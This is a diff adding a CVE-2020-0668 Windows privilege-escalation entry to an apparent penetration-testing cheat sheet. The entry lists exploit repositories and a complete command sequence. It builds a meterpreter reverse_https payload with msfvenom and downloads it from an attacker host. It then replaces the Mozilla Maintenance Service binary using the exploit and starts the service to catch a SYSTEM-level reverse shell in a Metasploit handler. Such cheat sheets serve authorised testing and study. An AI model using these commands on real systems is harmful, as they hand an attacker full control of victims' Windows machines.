@@ -4372,6 +4372,27 @@ https://github.com/Liuk3r/CVE-2023-32233
 https://github.com/GossiTheDog/HiveNightmare/
 ```
 
+- Windows Kernel Elevation of Privilege Vulnerability - CVE-2020-0668
+
+```
+https://github.com/RedCursorSecurityConsulting/CVE-2020-0668
+https://github.com/itm4n/UsoDllLoader
+https://github.com/xct/diaghub
+C:\> icacls "c:\Program Files (x86)\Mozilla Maintenance Service\maintenanceservice.exe"
+$ msfvenom -p windows/x64/meterpreter/reverse_https LHOST=<IP address> LPORT=<port> -f exe > maintenanceservice.exe
+PS C:\> wget http://<IP address>:<port>/maintenanceservice.exe -O maintenanceservice.exe
+PS C:\> wget http://<IP address>:<port>/maintenanceservice.exe -O maintenanceservice2.exe
+C:\> CVE-2020-0668.exe C:\Users\Public\Desktop\maintenanceservice.exe "C:\Program Files (x86)\Mozilla Maintenance Service\maintenanceservice.exe"
+C:\> icacls 'C:\Program Files (x86)\Mozilla Maintenance Service\maintenanceservice.exe'
+C:\> copy /Y C:\Users\Public\Desktop\maintenanceservice2.exe "c:\Program Files (x86)\Mozilla Maintenance Service\maintenanceservice.exe"
+msf> use exploit/multi/handler
+msf> set PAYLOAD windows/x64/meterpreter/reverse_https
+msf> set LHOST <IP address>
+msf> set LPORT <port>
+msf> exploit
+C:\> net start MozillaMaintenance
+```
+
 #16. - Exploit Research
 -----------------------------------------
 
